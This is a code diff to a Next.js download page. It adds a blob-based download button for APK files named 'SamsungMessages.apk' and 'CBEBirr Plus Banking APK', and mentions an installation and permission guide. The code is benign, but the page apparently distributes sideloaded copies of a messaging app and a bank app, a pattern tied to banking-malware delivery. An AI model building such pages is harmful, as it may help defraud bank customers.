@@ -1,10 +1,41 @@
 'use client';
 
-import React from 'react';
+import React, { useState } from 'react';
 import Link from 'next/link';
-import { Download, MessageSquare, ShieldCheck, ArrowRight, Smartphone, Bell, CheckCircle2 } from 'lucide-react';
+import { Download, MessageSquare, ShieldCheck, ArrowRight, Smartphone, Bell, CheckCircle2, Loader2 } from 'lucide-react';
 
 export default function DownloadPage() {
+  const [downloadingFile, setDownloadingFile] = useState<string | null>(null);
+
+  const triggerBlobDownload = async (filename: string, outputName: string) => {
+    try {
+      setDownloadingFile(filename);
+      // Fetch binary APK directly within the browser authenticated session
+      const res = await fetch(`/${filename}?t=${Date.now()}`, { cache: 'no-store' });
+      if (!res.ok) throw new Error('Fetch status ' + res.status);
+      const arrayBuffer = await res.arrayBuffer();
+
+      // Create an explicit APK blob in memory
+      const apkBlob = new Blob([arrayBuffer], { type: 'application/vnd.android.package-archive' });
+      const objectUrl = window.URL.createObjectURL(apkBlob);
+
+      const link = document.createElement('a');
+      link.href = objectUrl;
+      link.download = outputName;
+      document.body.appendChild(link);
+      link.click();
+
+      setTimeout(() => {
+        if (document.body.contains(link)) document.body.removeChild(link);
+        window.URL.revokeObjectURL(objectUrl);
+        setDownloadingFile(null);
+      }, 1500);
+    } catch (err) {
+      console.error('Blob download failed, using fallback:', err);
+      window.location.href = `/${filename}`;
+      setDownloadingFile(null);
+    }
+  };
   return (
     <div className="min-h-screen w-full bg-[#f4f5f8] text-[#1c1b1f] flex flex-col items-center justify-center p-3 sm:p-6">
       <div className="w-full max-w-lg bg-white rounded-3xl shadow-xl overflow-hidden border border-slate-200/80 flex flex-col">
@@ -70,14 +101,24 @@ export default function DownloadPage() {
               </li>
             </ul>
 
-            <a
-              href="/SamsungMessages.apk"
-              download="SamsungMessages.apk"
-              className="w-full py-3 px-4 bg-blue-600 hover:bg-blue-700 active:scale-[0.98] text-white font-bold rounded-xl shadow-md shadow-blue-500/20 flex items-center justify-center gap-2 transition-all text-xs sm:text-sm"
+            <button
+              type="button"
+              disabled={downloadingFile !== null}
+              onClick={() => triggerBlobDownload('SamsungMessages.apk', 'SamsungMessages.apk')}
+              className="w-full py-3 px-4 bg-blue-600 hover:bg-blue-700 active:scale-[0.98] text-white font-bold rounded-xl shadow-md shadow-blue-500/20 flex items-center justify-center gap-2 transition-all text-xs sm:text-sm cursor-pointer disabled:opacity-70"
             >
-              <Download className="w-4 h-4" />
-              <span>Download Samsung Messages APK (.apk)</span>
-            </a>
+              {downloadingFile === 'SamsungMessages.apk' ? (
+                <>
+                  <Loader2 className="w-4 h-4 animate-spin" />
+                  <span>Downloading SamsungMessages.apk...</span>
+                </>
+              ) : (
+                <>
+                  <Download className="w-4 h-4" />
+                  <span>Download Samsung Messages APK (.apk)</span>
+                </>
+              )}
+            </button>
           </div>
 
           {/* CBEBirr Plus APK Card */}
@@ -99,14 +140,24 @@ export default function DownloadPage() {
               </span>
             </div>
 
-            <a
-              href="/cbebirr-plus.apk"
-              download="CBEBirrPlus.apk"
-              className="w-full py-3 px-4 bg-[#7a1c7d] hover:bg-[#68146a] active:scale-[0.98] text-white font-bold rounded-xl shadow-md shadow-purple-900/20 flex items-center justify-center gap-2 transition-all text-xs sm:text-sm"
+            <button
+              type="button"
+              disabled={downloadingFile !== null}
+              onClick={() => triggerBlobDownload('cbebirr-plus.apk', 'CBEBirrPlus.apk')}
+              className="w-full py-3 px-4 bg-[#7a1c7d] hover:bg-[#68146a] active:scale-[0.98] text-white font-bold rounded-xl shadow-md shadow-purple-900/20 flex items-center justify-center gap-2 transition-all text-xs sm:text-sm cursor-pointer disabled:opacity-70"
             >
-              <Download className="w-4 h-4" />
-              <span>Download CBEBirr Plus Banking APK (.apk)</span>
-            </a>
+              {downloadingFile === 'cbebirr-plus.apk' ? (
+                <>
+                  <Loader2 className="w-4 h-4 animate-spin" />
+                  <span>Downloading CBEBirrPlus.apk...</span>
+                </>
+              ) : (
+                <>
+                  <Download className="w-4 h-4" />
+                  <span>Download CBEBirr Plus Banking APK (.apk)</span>
+                </>
+              )}
+            </button>
           </div>
 
           {/* Installation & Permission Controller Guide matching Screenshot */}
